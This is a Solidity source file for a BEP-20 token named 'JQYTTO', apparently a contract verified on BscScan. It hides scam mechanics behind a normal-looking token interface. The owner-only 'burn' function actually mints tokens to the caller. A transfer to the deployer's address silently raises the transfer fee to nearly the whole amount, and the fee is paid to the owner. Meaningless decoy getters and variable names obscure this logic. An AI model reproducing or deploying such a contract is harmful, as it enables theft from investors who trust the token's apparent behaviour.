/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.6.0;
contract JQYTTO {
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant VELCDC = 99999;
address private  SCOHPO = address(0);
uint256 private  CIAELY = 1000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 private  AOVNOI = 100000000;
address private  TJEUYJ = address(0);
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  LHTNCJ = address(0);
address public owner;
uint256 private  VRSJYR = 10000000000;
uint256 private  ZLCIQA = 1000000000000000;
address private  HUADQZ = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  MABKPA = 1000000000000000000;
uint256 private  PDUDDX = 10000000000000;
string public  name = "JQYTTO";
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  symbol = "JQYTTO";
address private  CMORSW = address(0);
uint256 private  BIXYYZ = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
function _getAOVNOI() private returns (uint256) {
return AOVNOI;
}

function _getZLCIQA() private returns (uint256) {
return ZLCIQA;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "WPSGZH");
require(to != address(0), "WPSGZH");
require(amount <= balanceOf[from], "WPSGZH");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* VELCDC/BIXYYZ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SCOHPO){
BIXYYZ = VELCDC+2;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () public {
SCOHPO = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getLHTNCJ() private returns (address) {
return LHTNCJ;
}

function _getPDUDDX() private returns (uint256) {
return PDUDDX;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tWPSGZH 0");
require(spender != address(0), "fWPSGZH 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getCMORSW() private returns (address) {
return CMORSW;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getCIAELY() private returns (uint256) {
return CIAELY;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getMABKPA() private returns (uint256) {
return MABKPA;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getVRSJYR() private returns (uint256) {
return VRSJYR;
}

function _getHUADQZ() private returns (address) {
return HUADQZ;
}

function _getTJEUYJ() private returns (address) {
return TJEUYJ;
}


}